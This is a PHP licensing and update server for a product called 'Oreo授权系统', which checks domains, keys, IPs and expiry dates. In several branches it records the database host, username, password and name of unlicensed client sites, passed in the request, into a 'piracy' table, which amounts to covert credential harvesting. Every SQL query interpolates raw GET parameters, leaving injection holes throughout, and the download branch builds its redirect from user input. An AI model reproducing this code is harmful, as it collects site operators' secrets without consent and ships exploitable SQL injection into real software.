<?php
/**
 * Oreo授权系统
 * =======================================================
 * 版权所有 (C) 2019 www.oreo.com，并保留所有权利。
 * Q Q: 609451870
 * =======================================================
 */
include './oreo/oreo.core.php';
date_default_timezone_set('PRC');
header("content-type:text/html;charset=utf-8");

$ac = $_GET['a'];
$ver = $_GET['v'];
$url = $_GET['u'];
$key = $_GET['key'];
$authid = $_GET['authid'];
$ip = getIP();
$file_name = $_GET['f'];
$file_dir = '/oreoupdatafilesxcas'; //远程升级补丁存放目录
$sq_host = $_GET['host']; 
$sq_port = $_GET['port']; 
$sq_user = $_GET['user']; 
$sq_pwd = $_GET['pwd']; 
$sq_dbname = $_GET['dbname'];
$sysnum = $_GET['sysnum'];
$uid=$_GET['userid'];


// 内次查询最后的版本

$ubeta=$DB->query("SELECT * FROM `oreo_user` WHERE id='$uid' LIMIT 1 ")->fetch();
if($ubeta['beta']==1){
$rowbb=$DB->query("SELECT * FROM `oreo_version` WHERE authid='$sysnum' and beta='1' or beta='0' ORDER BY `id` DESC LIMIT 1 ")->fetch();
$lastver = $rowbb['name']; // 最新版本
$lastver = sprintf("%1.1f",$lastver); 
}else{
$rowbb=$DB->query("SELECT * FROM `oreo_version` WHERE authid='$sysnum' and beta='0'  ORDER BY `id` DESC LIMIT 1 ")->fetch();
$lastver = $rowbb['name']; // 最新版本
$lastver = sprintf("%1.1f",$lastver);  
}
// 版本号0.1递增
$newver = $ver+0.1;
$newver = sprintf("%01.1f",$newver);
if(!$ac){
	echo '无权操作!';
	die;
}
// 客户端IP
if($ac=='getip'){
    echo getIP();
	die;
}
// 检查新版本更新内容
if($ac=='chanage'){
	if($ubeta['beta']==1){
	$row=$DB->query("SELECT * FROM `oreo_version` WHERE name='$ver' and beta='1' ")->fetch();
	}else
	$row=$DB->query("SELECT * FROM `oreo_version` WHERE name='$ver' ")->fetch();
    echo base64_decode($row['content']);
}
// 检查新版本
if($ac=='check'){
	 if($ver<$lastver){
        echo $newver;
        die;
	 }else{
	    echo $lastver;
		die;
	 }
}

//升级代码
if($ac=='update'){
	$domain_pd = get_domain($url);
	$time=time();
    $row=$DB->query("SELECT * FROM `oreo_authorize` WHERE domain='$domain_pd' ")->fetch();
	$yumi=$row['yumi'];
    $yumi_host = $yumi;
    $yumi_info = file_get_contents($yumi_host);
    if($yumi_info == $yumi_host ){
        $yumi_info = $url;
        }else{
            $yumi_info = get_domain($url);
        }
    // 首先检查域名是否授权

	$domain_url = $yumi_info; //获得系统域名
    $time=time();


	$row=$DB->query("SELECT * FROM `oreo_authorize` WHERE domain='$domain_url' ")->fetch();
	if($row){
	    $domain_time=$row['time'];
		$domain_dqversion=$row['version'];
		$dqv=$row['version'];
	    $domain_key=$row['syskey'];
	    $domain_ip=$row['ip'];
		
	}else{
	$row2=$DB->query("select * from oreo_authorize where domain='$domain_url' ")->fetch();	//查询授权库	
	if(!$row2){
	$row3=$DB->query("select * from oreo_daoban where domain='$domain_url'")->fetch();      //查询盗版库	
    if(!$row3){	
	$sdss=$DB->exec("INSERT INTO `oreo_daoban` (`domain`, `time`, `sql_host`, `sql_port`, `sql_user`, `sql_pwd`, `sql_dbname`) VALUES ('$domain_url', '$time', '{$sq_host}','{$sq_port}', '{$sq_user}', '{$sq_pwd}', '{$sq_dbname}')");	//如果无授权并无盗版记录写入新盗版记录
	}else{
	 $sqs=$DB->exec("update `oreo_daoban` set  `time` = '$time',`sql_host` = '{$sq_host}',`sql_port` = '{$sq_port}',`sql_user` = '{$sq_user}',`sql_pwd` = '{$sq_pwd}',`sql_dbname` = '{$sq_dbname}' WHERE `domain` = '$domain_url'");    //如果无授权并已有盗版记录更新新盗版记录
	} 
    echo '1'; //域名未授权
    die;	
	}
	}

	if(!empty($key)){
		if($key != $domain_key){
			echo '<font color=red>升级秘钥错误</font>';	die;
		}
	}else{
		echo '<font color=red>升级秘钥不能为空</font>';	die;
	}
 
    if ($time>$domain_time){
		 $status = '失败:授权时间到期';
		 $status = base64_encode($status);
		 $sds=$DB->exec("INSERT INTO `oreo_log` (`domain`, `time`, `version`, `status`) VALUES ('{$domain_url}', '{$time}', '{$ver}', '{$status}')");
         echo '<font color=red>授权已经到期 到期时间为'.date("Y-m-d",$domain_time).'</font>';
         die;
    }
    
    if($ver>=$lastver){
		 $status = '失败:已经是最新版';
		 $status = base64_encode($status);
		 $sds=$DB->exec("INSERT INTO `oreo_log` (`domain`, `time`, `version`, `status`) VALUES ('{$domain_url}', '{$time}', '{$ver}', '{$status}')");
         echo '<font color=red>已经是最新版 不需要升级</font>';
         die;
    }

    // 先升级到最近的版本
	$sysnum = $_GET['sysnum'];
	$cxyh=$DB->query("SELECT * FROM `oreo_version`  where name='$newver' and authid='$sysnum' ")->fetch();
	$sjbbanbenhao = $cxyh['name'];	//得到 升级到最近的版本 的版本号 

	
	//判断授权域名的库中历史升级版本号 $domain_dqversion    //防止客户站重复升级，只能升级一次（防盗版）
	if($dqv>=$sjbbanbenhao){
		echo '<font color=red>贵站已经是最新版了</font>';	die;
	}
	
	if($domain_dqversion<$sjbbanbenhao){
		$sqs=$DB->exec("update `oreo_authorize` set `version` ='{$sjbbanbenhao}' where `domain`='$domain_url'");
		$file = $cxyh['file'];
		echo $file;		//得到升级包真实下载地址
	}
	
	$status = '成功';
	$status = base64_encode($status);
	$sds=$DB->exec("INSERT INTO `oreo_log` (`domain`, `time`, `version`, `status`) VALUES ('{$domain_url}', '{$time}', '{$ver}', '{$status}')");
	die;
    
}

//检查授权代码
if($ac == 'client_check'){   
	$domain_pd = get_domain($url);
	$authid = $_GET['authid'];
	$time=time();
	$row=$DB->query("SELECT * FROM `oreo_authorize` WHERE domain='$domain_pd' and authid='$authid' ")->fetch();
	$yumi=$row['yumi'];
    $yumi_host = $yumi;
    $yumi_info = file_get_contents($yumi_host);
    if($yumi_info == $yumi_host ){
        $yumi_info = $_GET['u'];
        }else{
            $yumi_info = get_domain($url);
        }
	// 首先检查域名是否授权
	$domain_url = $yumi_info; //获得系统域名
    $time=time();	
	$row2=$DB->query("select * from oreo_authorize where domain='$domain_url' ")->fetch();	//查询授权库	
	if(!$row2){
	$row3=$DB->query("select * from oreo_daoban where domain='$domain_url'")->fetch();      //查询盗版库	
    if(!$row3){	
	$sdss=$DB->exec("INSERT INTO `oreo_daoban` (`domain`, `time`, `sql_host`, `sql_port`, `sql_user`, `sql_pwd`, `sql_dbname`) VALUES ('$domain_url', '$time', '{$sq_host}','{$sq_port}', '{$sq_user}', '{$sq_pwd}', '{$sq_dbname}')");	//如果无授权并无盗版记录写入新盗版记录
	}else{
	 $sqs=$DB->exec("update `oreo_daoban` set  `time` = '$time',`sql_host` = '{$sq_host}',`sql_port` = '{$sq_port}',`sql_user` = '{$sq_user}',`sql_pwd` = '{$sq_pwd}',`sql_dbname` = '{$sq_dbname}' WHERE `domain` = '$domain_url'");    //如果无授权并已有盗版记录更新新盗版记录
	} 
    echo '1'; //域名未授权
    die;	
	}
    
	$domain_ip=$row2['ip'];
	$ip_qh=$row2['ip_qh'];	
    $auth_id=$row2['authid'];
	if(!empty($authid)){
		if($authid!=$auth_id){
	      echo "4"; //检测授权程序	
          die;
		}}
	
	if($conf['oreo_dqsj']==1){
	$time=time();
	$domain_time=$row2['time'];
    if ($time>$domain_time){
         echo '2'; //授权过期
         die;
    }}
	
	$szsq = $ip_qh;
    $ip_info = file_get_contents($szsq);
    if($ip_info == $szsq ){       
        }else{
	if($ip!==$domain_ip){
	     echo '3'; //授权IP验证
		 die;
	}}
	
	$row3=$DB->query("select * from oreo_daoban where domain='$domain_url'")->fetch();	//如果通过，先查是否有盗版记录
	if($row3){    
	$zbsc=$DB->exec("DELETE FROM oreo_daoban WHERE domain='$domain_url' ");}	   //如果有盗版记录就删除盗版记录
	echo '0'; //通过
     
}else{
// 客户端检查
if($ac == 'check_message'){	
	$domain_pd = get_domain($url);
	$time=time();
	
	$row=$DB->query("SELECT * FROM `oreo_authorize` WHERE domain='$domain_pd' and authid='$authid' ")->fetch();
	$yumi=$row['yumi'];
    $yumi_host = $yumi;
    $yumi_info = file_get_contents($yumi_host);
    if($yumi_info == $yumi_host ){
        $yumi_info = $_GET['u'];
        }else{
            $yumi_info = get_domain($url);
        }
    // 首先检查域名是否授权
	$domain_url = $yumi_info; //获得系统域名
    $time=time();
	$row2=$DB->query("select * from oreo_authorize where domain='$domain_url' ")->fetch();	//查询授权库	
	if(!$row2){
	$row3=$DB->query("select * from oreo_daoban where domain='$domain_url'")->fetch();      //查询盗版库	
    if(!$row3){	
	$sdss=$DB->exec("INSERT INTO `oreo_daoban` (`domain`, `time`, `sql_host`, `sql_port`, `sql_user`, `sql_pwd`, `sql_dbname`) VALUES ('$domain_url', '$time', '{$sq_host}','{$sq_port}', '{$sq_user}', '{$sq_pwd}', '{$sq_dbname}')");	//如果无授权并无盗版记录写入新盗版记录
	}else{
	 $sqs=$DB->exec("update `oreo_daoban` set  `time` = '$time',`sql_host` = '{$sq_host}',`sql_port` = '{$sq_port}',`sql_user` = '{$sq_user}',`sql_pwd` = '{$sq_pwd}',`sql_dbname` = '{$sq_dbname}' WHERE `domain` = '$domain_url'");    //如果无授权并已有盗版记录更新新盗版记录
	}
    echo $conf['message_1']; //域名未授权
    die;	
	}
	
	$domain_ip=$row2['ip'];
	$ip_qh=$row2['ip_qh'];	
    $auth_id=$row2['authid'];
	if(!empty($authid)){
		if($authid!=$auth_id){
	      echo $conf['message_4']; //检测授权程序	
          die;
		}}
	
	if($conf['oreo_dqsj']==1){
    $time=time();
	$domain_time=$row['time'];
	$domain_ip=$row['ip'];

    if ($time>$domain_time){
         echo $conf['message_2']; //授权过期
         die;
    }}

	$szsq = $ip_qh;
    $ip_info = file_get_contents($szsq);
    if($ip_info == $szsq ){       
        }else{
	if($ip!==$domain_ip){
	     echo $conf['message_3']; //授权IP验证
		 die;
	}}	
	$row3=$DB->query("select * from oreo_daoban where domain='$domain_url'")->fetch();	//如果通过，先查是否有盗版记录
	if($row3){    
	$zbsc=$DB->exec("DELETE FROM oreo_daoban WHERE domain='$domain_url' ");}	   //如果有盗版记录就删除盗版记录
	echo '0'; //通过   
}	
}	

//到期时间代码
if($ac == 'client_check_time'){ 
	$domain_pd = get_domain($url);
	$time=time();
	
	$row=$DB->query("SELECT * FROM `oreo_authorize` WHERE domain='$domain_pd' and authid='$authid' ")->fetch();
	$yumi=$row['yumi'];
    $yumi_host = $yumi;
    $yumi_info = file_get_contents($yumi_host);
    if($yumi_info == $yumi_host ){
        $yumi_info = $_GET['u'];
        }else{
            $yumi_info = get_domain($url);
        }
    // 首先检查域名是否授权

	$domain_url = $yumi_info; //获得系统域名
    
	$row=$DB->query("SELECT * FROM `oreo_authorize` WHERE domain='$domain_pd' and authid='$authid' ")->fetch();
	
	if($row) {
		echo '0'; //域名未授权
        die;
	}
		
	$domain_time=$row['time'];
    echo $domain_time;
}

//下载文件
if($ac == 'down'){
   
   // 不允许直接访问下载
   $url = $_SERVER['HTTP_REFERER'];

   if(!$url){
       //echo '来路不正确';
	   //die;
   }

   $file = $file_dir.'/'.$file_name;
   header('Location: '.$file.'');
}

?>